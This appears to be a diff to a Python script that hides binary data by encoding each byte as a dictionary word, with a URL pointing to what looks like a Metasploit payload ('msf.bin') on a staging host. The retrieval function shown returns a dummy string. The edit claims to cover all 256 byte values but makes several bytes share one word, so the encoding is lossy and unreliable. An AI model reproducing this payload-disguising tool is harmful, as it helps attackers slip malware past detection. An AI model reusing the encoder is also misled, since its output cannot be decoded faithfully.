@@ -11,19 +11,32 @@ def encode_binary_with_dictionary(dictionary_path, output_path, binary_data):
         if word:
             word_map[word] = i
     
-    # Create reverse mapping for encoding
+    # Create reverse mapping for encoding (ensuring all 256 possible byte values have mappings)
     byte_to_index = {}
-    for word, byte_val in word_map.items():
-        byte_to_index[byte_val] = word
+    
+    # First, get a list of all words for cycling through if needed
+    available_words = list(word_map.keys())
+    if not available_words:
+        raise ValueError("Dictionary is empty. Cannot proceed with encoding.")
+    
+    # Ensure we have mappings for ALL possible byte values (0-255)
+    for byte_val in range(256):
+        # If we have a word specifically mapped to this byte value, use it
+        for word, val in word_map.items():
+            if val == byte_val:
+                byte_to_index[byte_val] = word
+                break
+        # If no direct mapping, cycle through available words
+        if byte_val not in byte_to_index:
+            # Use modulo to cycle through available words for any unmapped byte values
+            word_index = byte_val % len(available_words)
+            byte_to_index[byte_val] = available_words[word_index]
     
     # Encode each byte of the binary
     encoded_result = []
     for byte in binary_data:
-        if byte in byte_to_index:
-            encoded_result.append(byte_to_index[byte])
-        else:
-            # If no mapping exists for this byte value, use the byte value as string
-            encoded_result.append(str(byte))
+        # We now have mappings for all possible byte values
+        encoded_result.append(byte_to_index[byte])
     
     # Write encoded result to output file
     with open(output_path, 'w') as output_file:
@@ -74,7 +87,7 @@ def get_binary_data(url):
     return b'This is a dummy payload for testing the encoding mechanism.'
 
 # URL of the binary
-url = "https://stage.attck-deploy.net/msf2.bin"
+url = "https://stage.attck-deploy.net/msf.bin"
 
 # Get binary data
 binary_data = get_binary_data(url)
